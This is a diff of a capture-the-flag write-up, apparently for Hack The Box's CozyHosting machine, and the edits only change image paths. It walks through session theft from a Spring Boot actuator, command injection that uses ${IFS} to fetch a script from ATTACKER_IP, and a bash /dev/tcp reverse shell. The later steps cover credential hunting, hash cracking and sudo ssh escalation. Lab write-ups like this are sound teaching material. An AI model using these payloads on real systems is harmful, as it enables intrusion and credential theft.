@@ -72,14 +72,14 @@ error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 26
 
 Checking out the landing page shows that the organization offers a place to host cloud projects on their servers. The page is mostly static, but the contact section contains an email for their support staff at `info@cozyhosting.htb`.
 
-![](../assets/img/2026-03-10-CozyHosting/1.png)
+![](/assets/img/2026-03-10-CozyHosting/1.png)
 
 The services section describe a monitoring dashboard as well as an administrative interface for hosts. We'll probably want to gain access to someone's account via the login panel, however I'd like to enumerate other technology and possible users before carrying out a brute-force attack since it's usually my last resort.
 
 ## Exploitation
 My scans picked up an `/error` page which acts as the site's 404 response, but it responds strange to me. Heading to any page that doesn't exist throws a Whitelabel Error Page, which I had come across before. The response type and status code are still displayed and I decide to do some more digging on why this happened.
 
-![](../assets/img/2026-03-10-CozyHosting/2.png)
+![](/assets/img/2026-03-10-CozyHosting/2.png)
 
 A quick Google search reveals that this page is the default response for Spring Boot applications whenever an unhandled error or exception occurs. As per their information page - Spring Boot is an open-source, Java-based framework that makes it easy to create standalone, production-grade applications with minimal configuration. It is built on top of the comprehensive Spring Framework and uses an "opinionated" approach to simplify development and deployment.
 
@@ -125,25 +125,25 @@ actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Durati
 
 The most sensitive one would be the `/env` page as it exposes properties from Spring's ConfigurableEnvironment and could disclose user credentials. Unfortunately for us, it's subject to sanitization and navigating to it shows that the developers have configured everything correctly.
 
-![](../assets/img/2026-03-10-CozyHosting/3.png)
+![](/assets/img/2026-03-10-CozyHosting/3.png)
 
 ### Session Stealing
 Another interesting one we have access to is the `/sessions` page, which holds user's session IDs in store. Displaying it gives us just one value for the user `kanderson`.
 
-![](../assets/img/2026-03-10-CozyHosting/4.png)
+![](/assets/img/2026-03-10-CozyHosting/4.png)
 
 By replacing our original `JSESSION` cookie with the value of this new one, the site grants us a valid session as that user and we can now access their administrator dashboard.
 
-![](../assets/img/2026-03-10-CozyHosting/5.png)
+![](/assets/img/2026-03-10-CozyHosting/5.png)
 
 ### Command Injection
 The only notable thing on this page is a form to update connection settings so that CozyHosting will automatically patch our host. As with all fields allowing for user-supplied input, I start injecting payloads to test if this function is vulnerable.
 
-![](../assets/img/2026-03-10-CozyHosting/6.png)
+![](/assets/img/2026-03-10-CozyHosting/6.png)
 
 A bit of trial and error shows that we must provide a valid hostname, but the username field looks prone to command injection. The error shows that the second argument (id) was used in a separate command which couldn't be found.
 
-![](../assets/img/2026-03-10-CozyHosting/7.png)
+![](/assets/img/2026-03-10-CozyHosting/7.png)
 
 Knowing this, we can try to upload a reverse shell to the box with a simple curl command since all these filters make it difficult to throw a bash one liner in there without it getting shot down. I'll also add a semicolon and comment at the end so we can get rid of the `@localhost` portion. My reverse shell payload is a simple bash command to force a TCP connection towards my attacking IP on port 9001.
 
@@ -152,7 +152,7 @@ Knowing this, we can try to upload a reverse shell to the box with a simple curl
 bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/8.png)
+![](/assets/img/2026-03-10-CozyHosting/8.png)
 
 Looks like it's also filtering out whitespaces in the username field. Since we already know that it's using Bash from the first error, we can find a suitable replacement that fits that environment. Turns out the `${IFS}` variable (Internal Field Separator) can be utilized to split strings and will act similar to a normal space or tab.
 
@@ -162,7 +162,7 @@ After replacing all spaces in my previous payload with that shell var, no error 
 cbev;curl${IFS}http://ATTACKER_IP/revy.sh${IFS}-o${IFS}/tmp/revy.sh;#
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/9.png)
+![](/assets/img/2026-03-10-CozyHosting/9.png)
 
 All that's left is to fabricate another command that will execute that file and stand up a Netcat listener to catch the incoming connection.
 
@@ -171,7 +171,7 @@ Hostname = localhost
 Username = cbev;/bin/bash${IFS}/tmp/revy.sh;#
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/10.png)
+![](/assets/img/2026-03-10-CozyHosting/10.png)
 
 I upgrade and stabilize my shell with the typical `Python import pty` method and start internal enumeration to escalate privileges.
 
@@ -187,7 +187,7 @@ mkdir output & cd output
 grep -iR pass . 2>/dev/null
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/11.png)
+![](/assets/img/2026-03-10-CozyHosting/11.png)
 
 Whilst searching for strings that contained passwords, I discover that the spring.datasource.password property held a secure password which could be used to access a database. Upon further inspection on that file, we can see exactly how the database is being accessed by the Spring Boot application.
 
@@ -209,7 +209,7 @@ spring.datasource.password=[REDACTED]
 
 Another way to go about finding this is to decompile it using open-source tools. I download the Java Decompiler Graphical User Interface (jd-gui) from this [Github repo](https://java-decompiler.github.io/) and start it up with `java -jar jd-gui-1.6.6.jar`. After opening the cloudhosting JAR file inside the GUI, we can locate the database credentials under `application.properties` in htb.cloudhosting.
 
-![](../assets/img/2026-03-10-CozyHosting/12.png)
+![](/assets/img/2026-03-10-CozyHosting/12.png)
 
 It's a bit more work, but beats having to grep for seemingly random strings in a sea of files. Either way, we'll want to authenticate to the postgres DB on the box using those credentials; I use the psql tool already installed on the host for this next step. 
 
@@ -223,7 +223,7 @@ Type "help" for help.
 postgres=# \list
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/13.png)
+![](/assets/img/2026-03-10-CozyHosting/13.png)
 
 Listing the available databases show just one intriguing option named after the box. There's a hosts and users table inside, which should hold user credentials in the form of hashes or plaintext passwords.
 
@@ -232,7 +232,7 @@ postgres-# \c cozyhosting
 cozyhosting-# \dt
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/14.png)
+![](/assets/img/2026-03-10-CozyHosting/14.png)
 
 ### Cracking User Hash
 Nothing interesting resides in the hosts table, but users gives us two hashes for kanderson and an admin (most likely Josh).
@@ -241,21 +241,21 @@ Nothing interesting resides in the hosts table, but users gives us two hashes fo
 cozyhosting=# select * from users;
 ```
 
-![](../assets/img/2026-03-10-CozyHosting/15.png)
+![](/assets/img/2026-03-10-CozyHosting/15.png)
 
 Sending them over to Hashcat or JohnTheRipper to get their plaintext variants crack very fast. 
 
-![](../assets/img/2026-03-10-CozyHosting/16.png)
+![](/assets/img/2026-03-10-CozyHosting/16.png)
 
 Attempting to reuse that password for Josh over SSH works and we grab a proper shell on the box. Now we can begin looking for routes to escalate privileges to root.
 
 ### Abusing Sudo Permissions
 Listing Sudo privileges shows that Josh has the capability to run the SSH binary as root user with a password. The presence of a wildcard after it just means that we can execute it with any parameters.
 
-![](../assets/img/2026-03-10-CozyHosting/17.png)
+![](/assets/img/2026-03-10-CozyHosting/17.png)
 
 Attempting to just SSH on localhost and spawn a Bash shell won't work as we still need to provide a password. [GTFOBins](https://gtfobins.org/gtfobins/ssh/#shell) has a great method of escalating privileges by using the `ProxyCommand` option, which allows us to execute commands as root user and create a new shell.
 
-![](../assets/img/2026-03-10-CozyHosting/18.png)
+![](/assets/img/2026-03-10-CozyHosting/18.png)
 
 Grabbing the final flag under `/root/root.txt` completes this challenge. This box was relatively easy, but if your enumeration was lacking, it could prove quite a challenge trying to exploit the webapp. I hope this was helpful to anyone following along or stuck and happy hacking!
